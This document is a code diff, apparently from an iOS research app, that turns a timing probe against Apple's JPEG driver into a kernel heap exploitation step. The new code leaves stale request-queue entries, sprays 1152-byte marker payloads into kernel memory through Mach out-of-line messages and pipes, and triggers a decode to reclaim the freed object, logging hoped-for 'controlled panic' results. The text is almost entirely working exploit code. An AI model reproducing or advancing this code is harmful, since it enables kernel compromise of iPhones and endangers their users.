@@ -1990,10 +1990,10 @@ done:
     if (self.running) return;
     self.running = YES;
     [UIView animateWithDuration:0.2 animations:^{ self.logView.alpha = 1.0; }];
-    [self setStatus:@"P3Bp v2: interleaved..."];
+    [self setStatus:@"P3Bp v3: MARKER reclaim..."];
 
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        [self log:@"=== P3Bp v2: interleaved prog0/prog1 + srcID ctrl ==="];
+        [self log:@"=== P3Bp v3: OOL+pipe marker reclaim (far probe) ==="];
         io_service_t svc = [self findJPEGService];
         if (!svc) { [self log:@"no service"]; self.running = NO; return; }
         BOOL healthy = [self checkDriverHealth:svc];
@@ -2003,70 +2003,99 @@ done:
         NSData *jpegData = [self createTestJPEG:W height:H];
         IOSurfaceRef vSrc = [self createSourceSurface:jpegData];
         IOSurfaceRef vDst = [self createDestSurface:W height:H];
-        IOSurfaceRef rSrc0 = [self createSourceSurface:jpegData];
-        IOSurfaceRef rSrc1 = [self createSourceSurface:jpegData];
-        IOSurfaceRef rDst = [self createDestSurface:W height:H];
-        if (!vSrc||!vDst||!rSrc0||!rSrc1||!rDst) { IOObjectRelease(svc); self.running=NO; return; }
+        if (!vSrc || !vDst) { IOObjectRelease(svc); self.running=NO; return; }
         uint32_t vS=IOSurfaceGetID(vSrc), vD=IOSurfaceGetID(vDst);
-        uint32_t r0=IOSurfaceGetID(rSrc0), r1=IOSurfaceGetID(rSrc1), rD=IOSurfaceGetID(rDst);
 
-        mach_timebase_info_data_t tbi; mach_timebase_info(&tbi);
-        const int DOSE=5, CYCLES=40, R_CONNS=3, R_REQS=5;
+        // ---- marker payload: 1152 bytes, [+8]=0x4141414141414141, [+0x310]=1 ----
+        size_t CHUNK = 1152;
+        uint8_t *payload = calloc(CHUNK, 1);
+        uint64_t marker = 0x4141414141414141ULL;
+        memcpy(payload+8, &marker, 8);
+        payload[0x310] = 1;
 
-        uint64_t (^runPhaseSrc)(uint32_t srcID, BOOL prog, uint64_t tokenBase) = ^uint64_t(uint32_t srcID, BOOL prog, uint64_t tokenBase){
+        // ---------- OOL spray (may be blocked by sandbox) ----------
+        mach_port_t sprayPort = MACH_PORT_NULL;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &sprayPort);
+        mach_port_insert_right(mach_task_self(), sprayPort, sprayPort, MACH_MSG_TYPE_MAKE_SEND);
+        int oolSent = 0, oolFail = 0;
+
+        // ---------- PIPE array ----------
+        int pipes[64][2];
+        int nPipes = 0;
+
+        const int ROUNDS = 150;
+        BOOL usedOol = NO;
+        for (int r=0; r<ROUNDS && self.running; r++) {
+            // victim: stale queue entry
             io_connect_t vc = [self openUC:svc];
-            if (vc) { [self submitAsyncRequestsFlags:vc srcID:vS dstID:vD width:W height:H count:DOSE tokenBase:tokenBase progressive:NO]; IOServiceClose(vc); }
-            usleep(500);
-            io_connect_t rcs[3]; int rn=0;
-            for (int r=0;r<R_CONNS;r++){ io_connect_t rc=[self openUC:svc]; if(rc){ [self submitAsyncRequestsFlags:rc srcID:srcID dstID:rD width:W height:H count:R_REQS tokenBase:tokenBase+0x100+r progressive:prog]; rcs[rn++]=rc; } }
-            io_connect_t t=[self openUC:svc];
-            uint64_t us=0;
-            if(t){
+            if (vc) {
+                [self submitAsyncRequests:vc srcID:vS dstID:vD width:W height:H count:5 tokenBase:0xA000+r*0x10];
+                IOServiceClose(vc);
+            }
+            // OOL spray 30 chunks
+            int sentThis = 0;
+            for (int i=0; i<30; i++) {
+                mach_msg_base_t base;
+                memset(&base, 0, sizeof(base));
+                base.header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+                base.header.msgh_size = sizeof(base) + sizeof(mach_msg_ool_descriptor_t);
+                base.header.msgh_remote_port = sprayPort;
+                base.body.msgh_descriptor_count = 1;
+                mach_msg_ool_descriptor_t desc;
+                desc.address = payload;
+                desc.deallocate = FALSE;
+                desc.copy = MACH_MSG_PHYSICAL_COPY;
+                desc.size = (uint32_t)CHUNK;
+                desc.type = MACH_MSG_OOL_DESCRIPTOR;
+                kern_return_t kr = mach_msg(&base.header, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                            base.header.msgh_size, 0, sprayPort, 50, MACH_PORT_NULL);
+                if (kr == KERN_SUCCESS) { sentThis++; oolSent++; }
+                else oolFail++;
+            }
+            if (sentThis > 0) usedOol = YES;
+
+            // pipe: 30 chunks into fresh pipe (46KB < 64KB - no block)
+            if (nPipes < 64) {
+                if (pipe(pipes[nPipes]) == 0) {
+                    for (int i=0; i<30; i++) {
+                        ssize_t n = write(pipes[nPipes][1], payload, CHUNK);
+                        if (n != (ssize_t)CHUNK) break;
+                    }
+                    nPipes++;
+                }
+            }
+
+            // trigger: sync decode walks stale queue
+            io_connect_t t = [self openUC:svc];
+            if (t) {
                 AppleJPEGDriverIOStruct in={0},out={0};
-                in.sourceID=srcID; in.field_04=W*H; in.destID=rD; in.field_0C=W*H*4;
+                in.sourceID=vS; in.field_04=W*H; in.destID=vD; in.field_0C=W*H*4;
                 in.width=W; in.height=H; in.outWidth=W; in.outHeight=H;
                 in.subsampling=3; in.asyncToken=0;
                 size_t os=sizeof(out);
-                uint64_t t0=mach_absolute_time();
-                IOConnectCallStructMethod(t,1,&in,sizeof(in),&out,&os);
-                us=(mach_absolute_time()-t0)*tbi.numer/tbi.denom/1000;
+                kern_return_t kr = IOConnectCallStructMethod(t,1,&in,sizeof(in),&out,&os);
+                if (kr != KERN_SUCCESS && kr != 0xe00002d1) {
+                    [self log:@"[%d] trigger kr=0x%x", r, kr];
+                }
                 IOServiceClose(t);
             }
-            for(int r=0;r<rn;r++) IOServiceClose(rcs[r]);
-            return us;
-        };
-
-        // Interleaved: чередуем A0/A1/A0/A1...
-        uint64_t tim0[CYCLES], tim1[CYCLES]; int n0=0, n1=0;
-        for (int c=0; c<CYCLES; c++) {
-            // A0: reclaim src0, prog=0
-            uint64_t u0 = runPhaseSrc(r0, NO, 0xA000 + c*0x100);
-            if (u0) tim0[n0++]=u0;
-            // A1: reclaim src1, prog=1
-            uint64_t u1 = runPhaseSrc(r1, YES, 0xC000 + c*0x100);
-            if (u1) tim1[n1++]=u1;
-            if ((c+1)%10==0) {
+            if ((r+1)%25==0) {
                 BOOL h=[self checkDriverHealth:svc];
-                [self log:@"  [%d/40] n0=%d n1=%d health=%@", c+1, n0, n1, h?@"OK":@"BROKEN"];
-                if(!h) break;
+                [self log:@"  [%d/%d] ool=%d pipes=%d health=%@", r+1, ROUNDS, oolSent, nPipes, h?@"OK":@"BROKEN"];
+                if(!h) { [self log:@"  *** driver broken - likely controlled panic! check paniclog ***"]; break; }
             }
         }
 
-        void (^sort)(uint64_t*, int) = ^(uint64_t *arr, int n){ for(int i=0;i<n-1;i++) for(int j=i+1;j<n;j++) if(arr[i]>arr[j]){uint64_t t=arr[i];arr[i]=arr[j];arr[j]=t;} };
-        sort(tim0, n0); sort(tim1, n1);
-        uint64_t m0=n0?tim0[n0/2]:0, m1=n1?tim1[n1/2]:0;
-        [self log:@""];
-        [self log:@"  RESULT interleaved: prog0=%llu prog1=%llu us diff=%+lld", m0, m1, (int64_t)m1-(int64_t)m0];
-        [self log:@"  A0 n=%d A1 n=%d", n0, n1];
-        if (llabs((int64_t)m1-(int64_t)m0) > 200) {
-            [self log:@"  *** CONTROLLED RECLAIM CONFIRMED (diff>200us) ***"];
-        } else {
-            [self log:@"  diff < 200us: reclaim present but flag-offset not controlling timing"];
-        }
-
-        CFRelease(vSrc); CFRelease(vDst); CFRelease(rSrc0); CFRelease(rSrc1); CFRelease(rDst);
+        for (int i=0; i<nPipes; i++) { close(pipes[i][0]); close(pipes[i][1]); }
+        if (sprayPort) mach_port_destroy(mach_task_self(), sprayPort);
+        free(payload);
+        CFRelease(vSrc); CFRelease(vDst);
         IOObjectRelease(svc);
-        dispatch_async(dispatch_get_main_queue(), ^{ [self setStatus:@"P3Bp v2 done"]; });
+        [self log:@"=== P3Bp v3 done: oolSent=%d oolFail=%d pipes=%d usedOol=%@ ===", oolSent, oolFail, nPipes, usedOol?@"YES":@"NO"];
+        if (!usedOol) {
+            [self log:@"  NOTE: OOL blocked (sandbox) - if no panic, pipe data may not hit kalloc.type0.1152"];
+        }
+        dispatch_async(dispatch_get_main_queue(), ^{ [self setStatus:@"P3Bp v3 done"]; });
         self.running = NO;
     });
 }
